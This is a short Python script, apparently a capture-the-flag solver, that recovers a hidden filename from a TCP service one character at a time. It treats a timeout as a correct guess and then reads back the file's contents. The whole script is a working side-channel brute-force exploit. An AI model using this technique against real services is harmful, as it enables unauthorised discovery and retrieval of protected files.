import socket
from tqdm import tqdm
import os
import time

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "9999"))

filename = ""

while True:
    for c in tqdm("abcdefghijklmnopqrstuvwxyz0123456789._-"):  # Possible characters
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((HOST, PORT))
            sock.recv(1024)  # Read "Enter filename: "

            sock.sendall((filename + c).encode())  # Send current attempt
            sock.settimeout(1)  # ✅ Set a timeout instead of non-blocking mode
            
            try:
                response = sock.recv(1024).decode(errors="ignore")  # Try reading response
                if "Incorrect filename." in response:
                    continue  # Incorrect character, try the next one
            except socket.timeout:  # ✅ No response means timeout -> correct character
                filename += c
                print(f"Progress: {filename}")
                break  # Move to the next character
    else:
        break  # If no new character found, filename is complete

# ✅ Ensure the filename ends with a newline
filename += "\n"

# ✅ Send the full filename and read the file content
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((HOST, PORT))
    sock.recv(1024)  # Read "Enter filename: "

    sock.sendall(filename.encode())  # Send final filename with newline
    response = sock.recv(4096).decode(errors="ignore")

    if "File validated successfully." in response:
        print("File successfully validated! Receiving contents...\n")
        while True:
            data = sock.recv(1024)
            if not data or b"[END OF FILE]" in data:
                break
            print(data.decode(errors="ignore"), end="")

print("\nFile received successfully!")
